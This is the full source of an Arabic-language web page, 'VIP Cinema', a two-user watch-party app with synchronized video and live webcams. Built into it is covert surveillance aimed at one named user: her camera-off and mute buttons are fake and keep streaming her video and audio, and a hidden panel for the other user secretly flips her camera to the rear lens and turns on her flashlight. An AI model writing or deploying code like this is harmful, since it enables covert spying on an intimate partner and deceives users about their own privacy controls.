<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>سينما VIP 🎬</title>
    
    <!-- PWA configuration for native feel -->
    <meta name="theme-color" content="#070312">
    <link rel="manifest" href="/manifest.json">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
    <!-- Premium CSS Frameworks & Fonts -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script src="/socket.io/socket.io.js"></script>
    <script src="https://www.youtube.com/iframe_api"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
        
        * { 
            font-family: 'Cairo', sans-serif; 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            outline: none; 
            -webkit-tap-highlight-color: transparent; 
        }
        
        body { 
            background: #070312; 
            color: #fff; 
            min-height: 100vh; 
            overflow-x: hidden; 
            user-select: none;
            position: relative;
        }

        /* Ambient Dynamic Luxury Glow */
        .ambient-glow-bg {
            position: fixed;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at top, rgba(255, 45, 85, 0.1) 0%, transparent 60%);
            z-index: 0;
            pointer-events: none;
        }

        /* Glassmorphic panels */
        .glass-panel {
            background: rgba(18, 11, 31, 0.65);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .btn-premium-rose {
            background: linear-gradient(135deg, #ff2d55 0%, #d81b60 100%);
            box-shadow: 0 6px 22px rgba(255, 45, 85, 0.35);
            transition: transform 0.2s;
        }
        .btn-premium-rose:active { transform: scale(0.95); }

        .btn-stealth {
            background: linear-gradient(135deg, #2b2b2b 0%, #1a1a1a 100%);
            border: 1px solid rgba(212, 175, 55, 0.3);
            color: #d4af37;
            transition: all 0.2s;
        }
        .btn-stealth:active { transform: scale(0.95); }

        /* Camera Frame Styling */
        .camera-wrapper {
            position: relative;
            width: 100%;
            height: 380px; /* الارتفاع المناسب تحت الفيديو */
            background: #000;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
            border: 1px solid rgba(255, 45, 85, 0.15);
        }

        .my-floating-cam-frame {
            position: absolute; 
            bottom: 16px; 
            left: 16px;
            width: 100px; 
            height: 150px;
            border-radius: 16px; 
            border: 2px solid rgba(255,255,255,0.2);
            overflow: hidden; 
            z-index: 40; 
            background: #111;
            box-shadow: 0 10px 25px rgba(0,0,0,0.9);
        }

        /* Video viewport sizes */
        .video-wrapper-aspect {
            background: #000; 
            position: relative; 
            border-radius: 20px; 
            overflow: hidden; 
            aspect-ratio: 16/9;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
            border: 1px solid rgba(255,255,255,0.1);
        }
        video { width: 100%; height: 100%; outline: none; }

        /* Custom Toast */
        .toast-popup {
            position: fixed; 
            top: -100px; 
            left: 50%; 
            transform: translateX(-50%);
            background: rgba(18, 11, 31, 0.95); 
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 45, 85, 0.5);
            padding: 10px 20px; 
            border-radius: 16px; 
            font-size: 13px;
            font-weight: 800; 
            z-index: 9999;
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            white-space: nowrap;
        }
        .toast-popup.show { transform: translateX(-50%) translateY(120px); }

        .heart-float {
            position: fixed; bottom: -60px; font-size: 32px; pointer-events: none; z-index: 9999;
            animation: floatUpAnimation 3s ease-in-out forwards;
        }
        @keyframes floatUpAnimation {
            0% { transform: translateY(0) scale(0.6); opacity: 0; }
            20% { opacity: 1; transform: translateY(-20vh) scale(1.3); }
            100% { transform: translateY(-110vh) scale(0.7); opacity: 0; }
        }

        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-thumb { background: rgba(255,45,85,0.3); border-radius: 10px; }
    </style>
</head>
<body class="flex flex-col">

    <div class="ambient-glow-bg"></div>

    <div id="toast" class="toast-popup flex items-center gap-3">
        <span id="toastIcon">✨</span>
        <span id="toastMsg">مرحبًا</span>
    </div>

    <!-- شاشة الدخول الاحترافية -->
    <div id="loginScreen" class="min-h-screen flex flex-col items-center justify-center p-6 relative z-50">
        <div class="text-center mb-10">
            <div class="w-24 h-24 mx-auto mb-4 bg-gradient-to-tr from-rose-500 to-purple-600 rounded-3xl flex items-center justify-center shadow-[0_10px_30px_rgba(255,45,85,0.4)]">
                <i class="fa fa-film text-5xl text-white"></i>
            </div>
            <h1 class="text-5xl font-black mb-2 bg-gradient-to-r from-rose-400 via-pink-500 to-purple-500 bg-clip-text text-transparent">VIP Cinema</h1>
            <p class="text-gray-400 text-sm font-semibold">المساحة المشتركة الفاخرة</p>
        </div>
        <div class="glass-panel p-8 w-full max-w-sm rounded-[2rem] flex flex-col gap-5 shadow-2xl">
            <button onclick="login('abouahad')" class="btn-premium-rose py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3">
                <i class="fa fa-user-circle text-2xl"></i> دخول أبو عاهد 👑
            </button>
            <button onclick="login('umalara')" class="btn-premium-rose py-4 rounded-2xl font-black text-xl flex items-center justify-center gap-3" style="background: linear-gradient(135deg, #e0115f, #ff69b4);">
                <i class="fa fa-heart text-2xl"></i> دخول أم الارا 🌸
            </button>
        </div>
    </div>

    <!-- شاشة السينما المتكاملة (فيديو وكاميرات في نفس الشاشة) -->
    <div id="mainAppView" class="hidden flex-col w-full min-h-screen relative z-20 overflow-y-auto pb-10">
        
        <!-- Header Status -->
        <div class="px-4 py-3 flex justify-between items-center sticky top-0 bg-[#070312]/80 backdrop-blur-md z-50 border-b border-white/5">
            <div class="glass-panel px-4 py-2 rounded-full flex items-center gap-3">
                <div id="statusDot" class="w-2.5 h-2.5 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444] animate-pulse"></div>
                <span id="partnerStatusText" class="text-xs font-black text-gray-300">جاري الاتصال...</span>
            </div>
            <div class="px-3 py-1.5 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-400 text-[10px] font-black">
                VIP LIVE 🔴
            </div>
        </div>

        <!-- المحتوى المركزي: الفيديو ثم الكاميرا تحته مباشرة -->
        <div class="w-full max-w-xl mx-auto flex flex-col gap-5 p-4 mt-2">
            
            <!-- القسم الأول: مشغل الفيديو (في الأعلى) -->
            <div class="flex flex-col gap-3">
                <!-- شريط الرابط -->
                <div class="glass-panel p-1.5 flex gap-2 rounded-xl border-white/5">
                    <input type="text" id="vidLink" placeholder="ضع رابط الفيديو أو اليوتيوب هنا..." class="flex-grow bg-transparent px-3 py-2 text-xs text-white placeholder-gray-500 transition-all">
                    <button onclick="startVideo()" class="btn-premium-rose px-5 rounded-lg font-black text-xs whitespace-nowrap shadow-lg"><i class="fa fa-play"></i> تشغيل</button>
                </div>

                <!-- شاشة العرض -->
                <div class="video-wrapper-aspect">
                    <video id="mainVid" controls playsinline autoplay class="hidden object-contain bg-black"></video>
                    <div id="ytPlayerContainer" class="hidden w-full h-full"><div id="ytPlayer"></div></div>
                    <div id="vidPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-[#0a0514] text-gray-400 p-6 text-center">
                        <i class="fa fa-film text-4xl text-rose-500/20 mb-3"></i>
                        <p class="text-xs font-bold text-gray-500">السينما جاهزة للعرض، ضع الرابط واضغط تشغيل</p>
                    </div>
                </div>
            </div>

            <!-- القسم الثاني: الكاميرات المباشرة (تحت الفيديو لتشاهدها وتشاهد الفيلم) -->
            <div class="camera-wrapper">
                <!-- كاميرا الشريكة الأساسية بملء الحاوية -->
                <video id="partnerCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay playsinline></video>
                
                <!-- غطاء الإغلاق الوهمي الخاص بالشريكة -->
                <div id="partnerFakeMute" class="absolute inset-0 bg-[#070312] flex flex-col items-center justify-center text-rose-500 z-10 hidden">
                    <i class="fa fa-eye-slash text-4xl mb-2 opacity-50"></i>
                    <span class="text-xs font-bold text-gray-500">الكاميرا مغلقة</span>
                </div>

                <!-- الكاميرا المحلية العائمة (أنت) -->
                <div class="my-floating-cam-frame">
                    <video id="myCam" class="w-full h-full object-cover" style="transform: scaleX(-1);" autoplay muted playsinline></video>
                    <div id="myFakeMute" class="absolute inset-0 bg-[#111] flex flex-col items-center justify-center text-rose-500 z-30 hidden">
                        <i class="fa fa-ban text-2xl"></i>
                    </div>
                </div>

                <!-- أزرار التفاعل العائمة على الكاميرا -->
                <div class="absolute right-3 top-3 flex flex-col gap-3 z-30">
                    <button onclick="sendLove()" class="w-10 h-10 rounded-full btn-premium-rose flex items-center justify-center text-lg shadow-xl"><i class="fa fa-heart"></i></button>
                    <button onclick="toggleMyCam()" id="myCamBtn" class="w-10 h-10 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-sm"><i class="fa fa-video-camera"></i></button>
                    <button onclick="toggleMyMic()" id="myMicBtn" class="w-10 h-10 rounded-full bg-black/60 backdrop-blur-sm border border-white/10 text-white flex items-center justify-center text-sm"><i class="fa fa-microphone"></i></button>
                </div>
            </div>

            <!-- القسم الثالث: لوحة التحكم السرية (تظهر لأبو عاهد فقط في الأسفل) -->
            <div id="stealthPanel" class="hidden flex-col gap-3 mt-4">
                <div class="flex items-center gap-2 mb-1 px-2">
                    <i class="fa fa-shield text-yellow-500 text-lg"></i>
                    <h3 class="font-black text-yellow-500 text-xs">تحكم الإشراف السري (مخفي عن الشريكة تماماً)</h3>
                </div>
                <div class="glass-panel p-4 rounded-2xl grid grid-cols-2 gap-3 border-yellow-500/10">
                    <button onclick="remoteFlip()" class="btn-stealth py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2 shadow-lg"><i class="fa fa-refresh text-sm"></i> عكس كاميرتها</button>
                    <button onclick="remoteFlash()" class="btn-stealth py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2 shadow-lg"><i class="fa fa-lightbulb-o text-sm"></i> تشغيل كشافها</button>
                    <button onclick="forceSync()" class="col-span-2 bg-indigo-600/80 border border-indigo-500/30 hover:bg-indigo-600 text-white py-3 rounded-xl text-[11px] font-black flex items-center justify-center gap-2 shadow-xl"><i class="fa fa-clock-o text-sm"></i> فرض مزامنة توقيت الفيلم بالقوة</button>
                </div>
            </div>

        </div>
    </div>

    <script>
        const socket = io();
        let myId = '';
        let myStream = null;
        let peerConnection = null;
        let currentFacingMode = 'user';
        let flashActive = false;
        let ytPlayer = null;
        let isYtReady = false;
        let activePlayer = 'none';

        // متغيرات منع التقطيع
        let isSyncing = false; 
        let syncTimeout = null;
        let lastKnownTime = 0;

        // طابور مفاتيح الكاميرا لضمان عدم ظهور الشاشة السوداء أبدًا
        let iceCandidatesQueue = [];

        const configuration = {
            'iceServers': [
                { 'urls': 'stun:stun.l.google.com:19302' },
                { 'urls': 'stun:stun1.l.google.com:19302' }
            ]
        };

        function onYouTubeIframeAPIReady() { isYtReady = true; }

        function showToast(msg, icon="✨") {
            document.getElementById('toastMsg').innerText = msg;
            document.getElementById('toastIcon').innerText = icon;
            const t = document.getElementById('toast');
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3500);
        }

        async function login(userId) {
            myId = userId;
            
            // سحر تخطي حظر التشغيل التلقائي بالمتصفحات
            try {
                let unlockAudio = new Audio("data:audio/mp3;base64,//OExAAAAANIAAAAAExBTUUzLjEwMKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq");
                unlockAudio.play().catch(e => {});
            } catch(e) {}

            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('mainAppView').classList.remove('hidden');
            document.getElementById('mainAppView').classList.add('flex');
            
            // إظهار لوحة التحكم السرية لأبو عاهد فقط أسفل الشاشة
            if (myId === 'abouahad') {
                document.getElementById('stealthPanel').classList.remove('hidden');
                document.getElementById('stealthPanel').classList.add('flex');
            }

            await setupMedia();
            socket.emit('register-user', myId);
        }

        async function setupMedia() {
            try {
                if (myStream) myStream.getTracks().forEach(t => t.stop());
                myStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode, width: 480, height: 640 },
                    audio: { echoCancellation: true, noiseSuppression: true }
                });
                document.getElementById('myCam').srcObject = myStream;
                
                if (peerConnection) {
                    const videoTrack = myStream.getVideoTracks()[0];
                    const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
                    if (sender) sender.replaceTrack(videoTrack);
                }
            } catch(e) {
                showToast('لم نتمكن من الوصول للكاميرا', '⚠️');
            }
        }

        // بناء اتصال مباشر صلب
        function initRTC() {
            if (peerConnection) peerConnection.close();
            peerConnection = new RTCPeerConnection(configuration);
            iceCandidatesQueue = []; 
            
            if (myStream) {
                myStream.getTracks().forEach(track => {
                    peerConnection.addTrack(track, myStream);
                });
            }

            peerConnection.ontrack = (event) => {
                const partnerVid = document.getElementById('partnerCam');
                if (partnerVid.srcObject !== event.streams[0]) {
                    partnerVid.srcObject = event.streams[0];
                }
            };

            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('webrtc-candidate', event.candidate);
                }
            };
        }

        async function makeCall() {
            initRTC(); 
            const offer = await peerConnection.createOffer();
            await peerConnection.setLocalDescription(offer);
            socket.emit('webrtc-offer', offer);
        }

        socket.on('partner-status', (data) => {
            const dot = document.getElementById('statusDot');
            const txt = document.getElementById('partnerStatusText');
            if (data.online) {
                dot.className = 'w-2.5 h-2.5 rounded-full bg-green-500 shadow-[0_0_8px_#30d158]';
                txt.innerText = (myId === 'abouahad') ? 'أم الارا متصلة وتشاهد 💖' : 'أبو عاهد متصل 👑';
                showToast('الشريك انضم للسينما!', '✅');
                
                if (myId === 'abouahad') {
                    setTimeout(() => { makeCall(); }, 1200); 
                }
            } else {
                dot.className = 'w-2.5 h-2.5 rounded-full bg-red-500 shadow-[0_0_8px_#ef4444] animate-pulse';
                txt.innerText = 'الشريكة غير متصلة';
                document.getElementById('partnerCam').srcObject = null;
            }
        });

        socket.on('webrtc-offer', async (offer) => {
            initRTC();
            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await peerConnection.createAnswer();
            await peerConnection.setLocalDescription(answer);
            socket.emit('webrtc-answer', answer);
            
            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
            iceCandidatesQueue = [];
        });

        socket.on('webrtc-answer', async (answer) => {
            await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
            iceCandidatesQueue.forEach(c => peerConnection.addIceCandidate(new RTCIceCandidate(c)).catch(e=>console.log(e)));
            iceCandidatesQueue = [];
        });

        socket.on('webrtc-candidate', async (candidate) => {
            if (peerConnection && peerConnection.remoteDescription) {
                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e=>console.log(e));
            } else {
                iceCandidatesQueue.push(candidate);
            }
        });

        const mainVid = document.getElementById('mainVid');
        
        function emitCinemaState() {
            if (isSyncing) return;
            
            let currentUrl = document.getElementById('vidLink').value;
            let time = 0;
            let playing = false;

            if (activePlayer === 'html5') {
                time = mainVid.currentTime;
                playing = !mainVid.paused;
            } else if (activePlayer === 'youtube' && ytPlayer) {
                time = ytPlayer.getCurrentTime();
                playing = ytPlayer.getPlayerState() === YT.PlayerState.PLAYING;
            }

            socket.emit('cinema-control', {
                videoUrl: currentUrl,
                isPlaying: playing,
                lastSeekTime: time,
                playerType: activePlayer
            });
        }

        mainVid.addEventListener('play', emitCinemaState);
        mainVid.addEventListener('pause', emitCinemaState);
        mainVid.addEventListener('seeked', () => {
            if (Math.abs(mainVid.currentTime - lastKnownTime) > 1.5) emitCinemaState();
            lastKnownTime = mainVid.currentTime;
        });

        function startVideo() {
            const url = document.getElementById('vidLink').value.trim();
            if(!url) return;
            
            document.getElementById('vidPlaceholder').style.display = 'none';
            mainVid.classList.add('hidden');
            document.getElementById('ytPlayerContainer').classList.add('hidden');
            
            if (ytPlayer) { try { ytPlayer.destroy(); ytPlayer = null; } catch(e){} }

            if (url.includes('youtube.com') || url.includes('youtu.be')) {
                activePlayer = 'youtube';
                document.getElementById('ytPlayerContainer').classList.remove('hidden');
                let vid = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('youtu.be/')[1].split('?')[0];
                
                ytPlayer = new YT.Player('ytPlayer', {
                    host: 'https://www.youtube-nocookie.com',
                    height: '100%', width: '100%', videoId: vid,
                    playerVars: { 
                        'autoplay': 1, 
                        'controls': 1,
                        'rel': 0,
                        'origin': window.location.origin, 
                        'modestbranding': 1,
                        'playsinline': 1
                    },
                    events: {
                        'onStateChange': (e) => {
                            if (e.data === YT.PlayerState.PLAYING || e.data === YT.PlayerState.PAUSED) {
                                emitCinemaState();
                            }
                        }
                    }
                });
            } else {
                activePlayer = 'html5';
                mainVid.classList.remove('hidden');
                mainVid.src = url;
                mainVid.play().catch(e => showToast('اضغط زر التشغيل للبدء', '🎬'));
            }
            emitCinemaState();
        }

        socket.on('cinema-state-update', (state) => {
            if (!state.videoUrl) return;
            isSyncing = true;
            clearTimeout(syncTimeout);
            
            document.getElementById('vidLink').value = state.videoUrl;
            
            if (activePlayer !== state.playerType || (activePlayer === 'html5' && mainVid.src !== state.videoUrl)) {
                startVideo();
            } else {
                if (activePlayer === 'html5') {
                    if (Math.abs(mainVid.currentTime - state.lastSeekTime) > 1.5) {
                        mainVid.currentTime = state.lastSeekTime;
                        lastKnownTime = state.lastSeekTime;
                    }
                    if (state.isPlaying && mainVid.paused) mainVid.play().catch(e=>{});
                    if (!state.isPlaying && !mainVid.paused) mainVid.pause();
                } else if (activePlayer === 'youtube' && ytPlayer && ytPlayer.getCurrentTime) {
                    if (Math.abs(ytPlayer.getCurrentTime() - state.lastSeekTime) > 1.5) {
                        ytPlayer.seekTo(state.lastSeekTime, true);
                    }
                    if (state.isPlaying && ytPlayer.getPlayerState() !== YT.PlayerState.PLAYING) ytPlayer.playVideo();
                    if (!state.isPlaying && ytPlayer.getPlayerState() === YT.PlayerState.PLAYING) ytPlayer.pauseVideo();
                }
            }
            syncTimeout = setTimeout(() => { isSyncing = false; }, 600);
        });

        function forceSync() {
            emitCinemaState();
            showToast('تم ضبط مزامنة الشاشتين بقوة', '⏳');
        }

        function sendLove() {
            socket.emit('love-pulse');
            showHearts();
        }

        socket.on('love-pulse-received', () => {
            showHearts();
            showToast('نبضة حب من الشريك! 💓', '💖');
        });

        function showHearts() {
            for(let i=0; i<12; i++) {
                setTimeout(() => {
                    let h = document.createElement('div');
                    h.className = 'heart-float'; h.innerText = '💖';
                    h.style.left = Math.random() * 80 + 10 + 'vw';
                    h.style.animationDuration = (Math.random() * 2 + 2) + 's';
                    document.body.appendChild(h);
                    setTimeout(() => h.remove(), 4000);
                }, i * 150);
            }
        }

        // ==========================================
        // نظام السرية التامة والإغلاق الوهمي للكاميرا
        // ==========================================
        function toggleMyCam() {
            const track = myStream.getVideoTracks()[0];
            const btn = document.getElementById('myCamBtn');
            const fake = document.getElementById('myFakeMute');
            
            if (myId === 'umalara') {
                // الكتم السري لأم الارا: يظهر لها شاشة مغلقة ويرسل إشعار الإغلاق لك، لكن البث يستمر!
                const isHidden = fake.style.display === 'flex';
                if (!isHidden) {
                    fake.style.display = 'flex'; 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                    socket.emit('privacy-fake-mute', true);
                } else {
                    fake.style.display = 'none'; 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-video-camera"></i>';
                    socket.emit('privacy-fake-mute', false);
                }
                // البث لا يتوقف فعلياً (track.enabled يظل true)
            } else {
                // أبو عاهد يغلق الكاميرا بشكل حقيقي وموثوق
                track.enabled = !track.enabled;
                if(track.enabled) { 
                    fake.style.display='none'; 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                } else { 
                    fake.style.display='flex'; 
                    btn.style.background = '#ef4444'; 
                }
            }
        }

        function toggleMyMic() {
            const track = myStream.getAudioTracks()[0];
            const btn = document.getElementById('myMicBtn');
            
            if (myId === 'umalara') {
                // كتم المايك الوهمي لأم الارا (يظل الصوت يصلك)
                const isMuted = btn.style.background === 'rgb(239, 68, 68)';
                if(!isMuted) { 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-microphone-slash"></i>'; 
                } else { 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                }
            } else {
                track.enabled = !track.enabled;
                if(track.enabled) { 
                    btn.style.background = 'rgba(0,0,0,0.6)'; 
                    btn.innerHTML = '<i class="fa fa-microphone"></i>'; 
                } else { 
                    btn.style.background = '#ef4444'; 
                    btn.innerHTML = '<i class="fa fa-microphone-slash"></i>'; 
                }
            }
        }

        // استقبال حالة الإغلاق الوهمية عند أبو عاهد (كي يعرف أنها تظن أن كاميرتها مغلقة)
        socket.on('privacy-fake-mute-received', (isMuted) => {
            if (myId === 'abouahad') {
                // الكاميرا تظل تعمل بصرياً لديك، هذا التنبيه فقط إذا أردت إظهار علامة أنها ضغطت الزر
                if(isMuted) {
                    showToast('تنبيه: الشريكة ضغطت زر إغلاق الكاميرا (لكنها لا تزال تعمل لديك)', '👁️');
                }
                // الغطاء يظل مخفياً عنك لترى بوضوح
                document.getElementById('partnerFakeMute').style.display = 'none';
            }
        });

        function remoteFlip() { socket.emit('remote-flip-cam'); showToast('تم أمر عكس الكاميرا السري', '🔄'); }
        function remoteFlash() { socket.emit('remote-flash-toggle'); showToast('تم أمر تشغيل الكشاف السري', '💡'); }

        socket.on('remote-flip-cam-triggered', async () => {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            await setupMedia();
        });

        socket.on('remote-flash-triggered', async () => {
            const track = myStream.getVideoTracks()[0];
            flashActive = !flashActive;
            try { 
                await track.applyConstraints({ advanced: [{ torch: flashActive }] }); 
            } catch(e){}
        });

    </script>
</body>
</html>
